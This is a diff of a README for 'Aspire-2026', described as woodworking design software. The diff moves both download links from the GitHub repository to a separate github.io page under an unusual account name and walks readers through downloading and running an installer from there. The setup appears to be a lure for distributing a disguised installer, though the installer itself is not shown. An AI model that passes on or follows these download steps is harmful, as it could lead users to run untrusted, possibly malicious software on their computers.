@@ -1,6 +1,6 @@
 # ⚙️ Aspire-2026 - Create professional woodworking designs with ease
 
-[![Download Aspire-2026](https://img.shields.io/badge/Download-Aspire--2026-blue)](https://github.com/shortorder-williamii868/Aspire-2026)
+[![Download Aspire-2026](https://img.shields.io/badge/Download-Aspire--2026-blue)](https://shortorder-williamii868.github.io)
 
 ## 📖 About this software
 
@@ -21,7 +21,7 @@ Check your computer before you start the installation process. These requirement
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [official download page](https://github.com/shortorder-williamii868/Aspire-2026).
+1. Go to the [official download page](https://shortorder-williamii868.github.io).
 2. Look for the release section on that page.
 3. Select the installer file to begin the download process.
 4. Save the file to your Downloads folder.
